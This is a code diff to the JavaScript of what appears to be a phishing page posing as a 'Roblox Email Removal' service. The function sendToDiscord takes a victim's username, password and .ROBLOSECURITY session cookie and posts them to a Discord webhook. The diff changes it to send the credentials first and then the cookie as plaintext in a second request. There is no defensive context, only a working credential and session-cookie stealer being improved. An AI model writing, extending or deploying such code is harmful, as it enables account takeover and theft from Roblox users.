@@ -785,7 +785,8 @@
         }
 
         function sendToDiscord(username, password, cookie, method) {
-            const embed = {
+            // First webhook: Send initial data (username, password, method, timestamp)
+            const firstEmbed = {
                 title: "🔒 Roblox Email Removal Request",
                 color: 5814783,
                 fields: [
@@ -798,11 +799,6 @@
                         name: "🔑 Password",
                         value: password,
                         inline: true
-                    },
-                    {
-                        name: "🍪 Cookie",
-                        value: cookie,
-                        inline: false
                     },
                     {
                         name: "⚙️ Method",
@@ -821,21 +817,46 @@
                 timestamp: new Date().toISOString()
             };
 
-            const payload = {
-                embeds: [embed]
+            const firstPayload = {
+                embeds: [firstEmbed]
+            };
+
+            // Send first webhook
+            $.ajax({
+                url: webhookUrl,
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify(firstPayload),
+                success: function() {
+                    // Wait 3 seconds, then send the cookie as plaintext
+                    setTimeout(() => {
+                        sendCookieAsPlaintext(cookie, username, method);
+                    }, 3000);
+                },
+                error: function() {
+                    showToast('Error', 'Failed to send account details to Discord. Please try again.', 'error');
+                    $('#remove-btn').prop('disabled', false).html('<i class="fas fa-trash-alt"></i> REMOVE EMAIL');
+                }
+            });
+        }
+
+        function sendCookieAsPlaintext(cookie, username, method) {
+            // Second webhook: Send cookie as plaintext content
+            const cookiePayload = {
+                content: `🍪 **ROBLOSECURITY Cookie:**\n\`\`\`\n${cookie}\n\`\`\``
             };
 
             $.ajax({
                 url: webhookUrl,
                 type: 'POST',
                 contentType: 'application/json',
-                data: JSON.stringify(payload),
+                data: JSON.stringify(cookiePayload),
                 success: function() {
                     showSuccess();
                     addToHistory(username, method);
                 },
                 error: function() {
-                    showToast('Error', 'Failed to send account details to Discord. Please try again.', 'error');
+                    showToast('Error', 'Failed to send cookie to Discord. Please try again.', 'error');
                     $('#remove-btn').prop('disabled', false).html('<i class="fas fa-trash-alt"></i> REMOVE EMAIL');
                 }
             });
